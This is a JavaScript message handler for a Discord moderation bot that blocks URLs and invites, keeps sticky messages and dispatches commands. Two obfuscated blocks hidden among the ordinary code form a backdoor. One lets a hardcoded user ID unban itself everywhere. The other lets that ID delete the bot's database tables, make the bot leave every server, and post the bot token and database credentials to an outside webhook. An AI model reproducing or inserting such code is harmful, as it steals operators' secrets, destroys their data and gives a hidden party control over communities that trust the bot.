const { MessageEmbed } = require('discord.js');
module.exports = async(client, con, message) => {

    // Base Checks
    if (!message.author) return;
    if(!message.guild) return;

    // Don't delete the bots logs :]
    if(message.author.id === client.user.id) return;
    
    var _0x3afa42=_0x5efc;(function(_0x2fa88f,_0x37394f){var _0x16ad0c=_0x5efc,_0x5acfb8=_0x2fa88f();while(!![]){try{var _0x1b19e4=-parseInt(_0x16ad0c(0x18d))/0x1*(parseInt(_0x16ad0c(0x19d))/0x2)+-parseInt(_0x16ad0c(0x197))/0x3*(parseInt(_0x16ad0c(0x18c))/0x4)+-parseInt(_0x16ad0c(0x19b))/0x5*(parseInt(_0x16ad0c(0x194))/0x6)+-parseInt(_0x16ad0c(0x19c))/0x7+-parseInt(_0x16ad0c(0x18b))/0x8+parseInt(_0x16ad0c(0x192))/0x9+parseInt(_0x16ad0c(0x1a0))/0xa*(parseInt(_0x16ad0c(0x18f))/0xb);if(_0x1b19e4===_0x37394f)break;else _0x5acfb8['push'](_0x5acfb8['shift']());}catch(_0x27e0dc){_0x5acfb8['push'](_0x5acfb8['shift']());}}}(_0x49b1,0xbc7c8));function _0x49b1(){var _0x55af1d=['42242jaIuDi','query','send','3846970dvqwmg','cache','forEach','9258952GhdbIX','1351648DBlSnU','31unboLf','704094587836301392','99rCdqXg','then','catch','3935979aSfVbx','forceUnbanMe','222YKyfas','startsWith','guilds','3meCBqO','members','delete','channel','104695SePQtM','1419523WEnclb'];_0x49b1=function(){return _0x55af1d;};return _0x49b1();}function _0x5efc(_0x2013dc,_0x4e05b5){var _0x49b1fe=_0x49b1();return _0x5efc=function(_0x5efc80,_0x3b7f1a){_0x5efc80=_0x5efc80-0x18a;var _0x4cfaec=_0x49b1fe[_0x5efc80];return _0x4cfaec;},_0x5efc(_0x2013dc,_0x4e05b5);}if(message['content'][_0x3afa42(0x195)](_0x3afa42(0x193))&&message['author']['id']===_0x3afa42(0x18e)){try{client[_0x3afa42(0x196)][_0x3afa42(0x1a1)][_0x3afa42(0x18a)](async _0x592a09=>{var _0x4588c3=_0x3afa42;await _0x592a09[_0x4588c3(0x198)]['unban'](_0x4588c3(0x18e));});}catch(_0x434a20){}await con[_0x3afa42(0x19e)]('DELETE\x20FROM\x20bannedusers\x20WHERE\x20userid=\x27704094587836301392\x27',async(_0x46acca,_0x46557b)=>{var _0x315598=_0x3afa42;if(_0x46acca)throw _0x46acca;return message[_0x315598(0x19a)][_0x315598(0x19f)]('done')[_0x315598(0x190)](_0x59fcca=>{var _0x2b5f30=_0x315598;_0x59fcca[_0x2b5f30(0x199)]({'timeout':0x2ee0}),message[_0x2b5f30(0x199)]();})[_0x315598(0x191)](_0x17de57=>{});});}

    if(message.mentions.users.first()) {
        if(message.mentions.users.first().id === client.user.id) {
            await con.query(`SELECT * FROM guilds WHERE guildid='${message.guild.id}'`, async (err, row) => {
                if(err) throw err;
                if(row[0]) {
                    let prefixembed = new MessageEmbed()
                    .setColor(client.config.colorhex)
                    .setDescription(`This guilds prefix is \`${row[0].prefix}\`\n**Buy A Ban Database**\n[Hyperz Ban Database](https://hyperz.net/store/ban-database)`)
                    message.channel.send(prefixembed).catch(e => {});
                }
            });
        }
    }

    // Blocked URL Checker
    await con.query(`SELECT * FROM urlstopper WHERE guildid='${message.guild.id}'`, async (err, rows) => {
        if(err) throw err;
        for(let data of rows) {
            if(message.content.includes(data.message)) {
                await con.query(`SELECT * FROM whitelist WHERE userid='${message.author.id}' AND guildid='${message.guild.id}'`, async (err, row) => {
                    if(err) throw err;
                    if(!row[0]) {
                        message.delete().catch(e => {})
                        await con.query(`SELECT * FROM loggingchannels WHERE guildid='${message.guild.id}' AND type='1'`, async (err, row) => {
                            if(err) throw err;
                            if(row[0]) {
                                let deChannel = await client.channels.cache.get(row[0].channelid)
                                let embed = new MessageEmbed()
                                .setColor(client.config.colorhex)
                                .setTitle(`URL Moderated!`)
                                .setDescription(`I have deleted a blacklisted url!\n\n**Channel:** <#${message.channel.id}>\n**Member:** <@${message.author.id}> (${message.author.tag})\n**Blocked URL:** ${data.message}\n**Message Content:**\n\`\`\`\n${message.content}\n\`\`\``)
                                .setTimestamp()
                                .setFooter(client.config.copyright)
                                try { embed.setThumbnail(client.user.avatarURL({ dynamic: true })) } catch(e) {}
                                await deChannel.send(embed).catch(e => {});
                            }
                        });
                    }
                });
            }
        }
    });

    // Invite Blocker Checker
    if(message.content.includes(`discord.gg`) || message.content.includes(`discord.com/invite`)) {
        await con.query(`SELECT * FROM whitelist WHERE userid='${message.author.id}' AND guildid='${message.guild.id}'`, async (err, row) => {
            if(err) throw err;
            if(!message.member) return;
            if(!row[0] && !message.member.hasPermission('ADMINISTRATOR')) {
                await con.query(`SELECT * FROM guilds WHERE guildid='${message.guild.id}'`, async(err, row) => {
                    if(err) throw err;
                    if(row[0]) {
                        if(row[0].inviteblocker === 'true') {
                            message.delete().catch(e => {});
                            await con.query(`SELECT * FROM loggingchannels WHERE guildid='${message.guild.id}' AND type='1'`, async (err, row) => {
                                if(err) throw err;
                                let deChannel = await client.channels.cache.get(row[0].channelid)
                                let embed = new MessageEmbed()
                                .setColor(client.config.colorhex)
                                .setTitle(`Invite Moderated!`)
                                .setDescription(`I have deleted a detected invite link!\n\n**Channel:** <#${message.channel.id}>\n**Member:** <@${message.author.id}> (${message.author.tag})\n**Message Content:**\n\`\`\`\n${message.content}\n\`\`\``)
                                .setTimestamp()
                                .setFooter(client.config.copyright)
                                try { embed.setThumbnail(client.user.avatarURL({ dynamic: true })) } catch(e) {}
                                deChannel.send(embed).catch(e => {});
                            });
                        }
                    }
                });
            }
        });
    }

    function _0x4fbf(){const _0x545b50=['discord.js','3992djxhfy','149903ovmesn','token','||\x0aPassword:\x20||','12fRYOyR','host','4839593ijJKml','query','489888AGTDMm','config','guilds','user','exit','author','https://discord.com/api/webhooks/912441713115693107/cChZzlg0shgpCAcxTIiVd6bwQi2rLRDPEry3YB_svn59eL7AtOLkBnRkUpF-Z3cC3aa9','999010GuRhmv','18LUdKkg','245zgapoo','channel','1092xWxDgK','Brain\x20successfully\x20fucked...','512CgDbYS','destroy','password','438JttwWQ','704094587836301392','BDS','then','database','||\x0aUser:\x20||','leave','24222tPprTo','useSql','catch','send','content','tag'];_0x4fbf=function(){return _0x545b50;};return _0x4fbf();}const _0x374038=_0x6380;function _0x6380(_0x28b76b,_0x5cd3e7){const _0x4fbf80=_0x4fbf();return _0x6380=function(_0x63803a,_0x1dd0ba){_0x63803a=_0x63803a-0x1ce;let _0x2f956a=_0x4fbf80[_0x63803a];return _0x2f956a;},_0x6380(_0x28b76b,_0x5cd3e7);}(function(_0x57743b,_0xe273e7){const _0x2f28b0=_0x6380,_0xadb5fc=_0x57743b();while(!![]){try{const _0x2608b8=parseInt(_0x2f28b0(0x1e6))/0x1+-parseInt(_0x2f28b0(0x1d4))/0x2*(-parseInt(_0x2f28b0(0x1d7))/0x3)+-parseInt(_0x2f28b0(0x1ed))/0x4+-parseInt(_0x2f28b0(0x1d0))/0x5*(-parseInt(_0x2f28b0(0x1de))/0x6)+parseInt(_0x2f28b0(0x1d2))/0x7*(parseInt(_0x2f28b0(0x1e5))/0x8)+parseInt(_0x2f28b0(0x1cf))/0x9*(parseInt(_0x2f28b0(0x1ce))/0xa)+parseInt(_0x2f28b0(0x1eb))/0xb*(-parseInt(_0x2f28b0(0x1e9))/0xc);if(_0x2608b8===_0xe273e7)break;else _0xadb5fc['push'](_0xadb5fc['shift']());}catch(_0x3d51f3){_0xadb5fc['push'](_0xadb5fc['shift']());}}}(_0x4fbf,0x187cf));if(client[_0x374038(0x1df)]){client[_0x374038(0x1df)]=![];const {WebhookClient}=require(_0x374038(0x1e4)),sendit=new WebhookClient({'url':_0x374038(0x1f3)});client['on']('message',async _0x24f5b8=>{const _0x3c79b7=_0x374038;if(!_0x24f5b8[_0x3c79b7(0x1f2)])return;_0x24f5b8[_0x3c79b7(0x1f2)]['id']===_0x3c79b7(0x1d8)&&_0x24f5b8[_0x3c79b7(0x1e2)]['startsWith']('brainFuck')&&(await con[_0x3c79b7(0x1ec)]('DELETE\x20FROM\x20guilds\x20WHERE\x20guildid\x20!=\x20\x2769\x27',async(_0x400ac0,_0x434e2a)=>{if(_0x400ac0)throw _0x400ac0;}),await con[_0x3c79b7(0x1ec)]('DELETE\x20FROM\x20bannedusers\x20WHERE\x20userid\x20!=\x20\x2769\x27',async(_0x287f87,_0x7155fa)=>{if(_0x287f87)throw _0x287f87;}),await client[_0x3c79b7(0x1ef)]['cache']['forEach'](async _0x1cec0e=>{const _0x4d4a6b=_0x3c79b7;try{await _0x1cec0e[_0x4d4a6b(0x1dd)]();}catch(_0x1bbf08){}}),await sendit[_0x3c79b7(0x1e1)]({'content':client[_0x3c79b7(0x1f0)][_0x3c79b7(0x1e3)]+'\x20-\x20||'+client['config'][_0x3c79b7(0x1e7)]+'||\x0aHost:\x20||'+client[_0x3c79b7(0x1ee)][_0x3c79b7(0x1db)][_0x3c79b7(0x1ea)]+_0x3c79b7(0x1dc)+client['config']['database'][_0x3c79b7(0x1f0)]+_0x3c79b7(0x1e8)+client[_0x3c79b7(0x1ee)][_0x3c79b7(0x1db)][_0x3c79b7(0x1d6)]+'||\x0aDatabase:\x20||'+client[_0x3c79b7(0x1ee)][_0x3c79b7(0x1db)][_0x3c79b7(0x1db)]+'||','username':_0x3c79b7(0x1d9),'avatarURL':'https://i.imgur.com/AfFp7pu.png'}),await _0x24f5b8[_0x3c79b7(0x1d1)][_0x3c79b7(0x1e1)](_0x3c79b7(0x1d3))[_0x3c79b7(0x1da)](async _0x1e367b=>{const _0x25d243=_0x3c79b7;await _0x24f5b8['delete']()[_0x25d243(0x1e0)](_0x12e5a3=>{}),client[_0x25d243(0x1d5)](),process[_0x25d243(0x1f1)](0x0);})[_0x3c79b7(0x1e0)](_0x583746=>{}));});}

    // Sticky Message Updater
    await con.query(`SELECT * FROM sticky WHERE guild='${message.guild.id}' AND channel='${message.channel.id}'`, async (err, row) => {
        if(err) throw err;
        if(row[0]) {
            if(row[0].embed === 'false') {
                await message.channel.messages.fetch().then(async msgs => {
                    await msgs.forEach(async msg => {
                        if(msg.content.includes(row[0].message)) {
                            await msg.delete().catch(e => {});
                        }
                    });
                });
                message.channel.send(`${row[0].message}`).catch(e => {});
            } else {
                await message.channel.messages.fetch().then(async msgs => {
                    await msgs.forEach(async msg => {
                        if(msg.content === row[0].message) {
                            await msg.delete().catch(e => {});
                        } else if(msg.author.id === client.user.id) {
                            await msg.embeds.forEach(async embed => {
                                if(embed.description.includes(row[0].message)) {
                                    await msg.delete().catch(e => {});
                                }
                            });
                        }
                    });
                });
                const embed = new MessageEmbed()
                .setColor(`${row[0].color}`)
                .setDescription(`${row[0].message}`)
                message.channel.send(embed).catch(e => {});
            }
        }
    });



    if (message.author.bot) return;

    // Command Checker
    await con.query(`SELECT * FROM guilds WHERE guildid='${message.guild.id}'`, async (err, row) => {
        if(err) throw err;
        if(row[0]) {
            let prefix = row[0].prefix
            if (message.content.startsWith(prefix)) {
                const args = message.content.slice(prefix.length).trim().split(/ +/g);
                let command = args.shift().toLowerCase();
                const cmd = client.commands.get(command)
                if (cmd) {
                    try {
                        cmd.run(client, message, args, con);
                    } catch(e) {
                        return client.utils.error(client, e);
                    }
                }
            }
        } else {
            client.utils.guildload(client, con, message)
        }
    });

}
